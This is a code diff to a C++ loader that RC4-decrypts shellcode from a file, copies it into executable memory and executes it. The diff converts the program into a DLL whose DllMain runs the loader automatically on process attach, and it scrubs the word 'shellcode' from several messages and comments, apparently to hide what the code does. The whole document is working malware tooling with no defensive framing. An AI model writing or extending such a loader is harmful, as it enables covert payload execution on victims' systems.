@@ -40,7 +40,7 @@ void LoadShellcode(const char* filename) {
     // Load encrypted shellcode from file
     std::vector<char> buffer = LoadShellcodeFromFile(filename);
     if (buffer.empty()) {
-        std::cerr << "Failed to load shellcode from file." << std::endl;
+       // std::cerr << "Failed to load from file." << std::endl;
         return;
     }
 
@@ -49,7 +49,7 @@ void LoadShellcode(const char* filename) {
     RC4Decrypt(buffer, key);
 
     // Debug: Display decrypted shellcode
-    std::cout << "Decrypted shellcode (first 10 bytes): ";
+   // std::cout << "Decrypted  (first 10 bytes): ";
     for (size_t i = 0; i < std::min<size_t>(10, buffer.size()); ++i)
         std::cout << std::hex << (unsigned char)buffer[i] << " ";
     std::cout << std::endl;
@@ -63,10 +63,10 @@ void LoadShellcode(const char* filename) {
 
     std::cout << "Executable memory allocated at: " << exec << std::endl;
 
-    // Copy shellcode to allocated memory
+    // Copy code to allocated memory
     std::memcpy(exec, buffer.data(), buffer.size());
 
-    // Execute the shellcode
+    // Execute the code
     try {
         void (*func)() = (void(*)())exec;
         std::cout << "Executing shellcode..." << std::endl;
@@ -81,8 +81,24 @@ void LoadShellcode(const char* filename) {
     std::cout << "Executable memory released." << std::endl;
 }
 
-int main() {
-    const char* filename = "enc.txt"; // Provide the correct path to the encrypted shellcode file
+int running() {
+    const char* filename = "enc.txt"; // Provide the correct path to the encrypted file
     LoadShellcode(filename);
     return 0;
+}
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
+    switch (fdwReason) {
+    case DLL_PROCESS_ATTACH:
+        DisableThreadLibraryCalls(hinstDLL); // Prevent thread notifications for efficiency
+        running(); // Load and execute the shellcode when the DLL is attached
+        break;
+    case DLL_PROCESS_DETACH:
+        // Perform cleanup tasks if necessary
+        break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+        // Thread-specific tasks (not used in this example)
+        break;
+    }
+    return TRUE; // Indicate successful initialization
 }
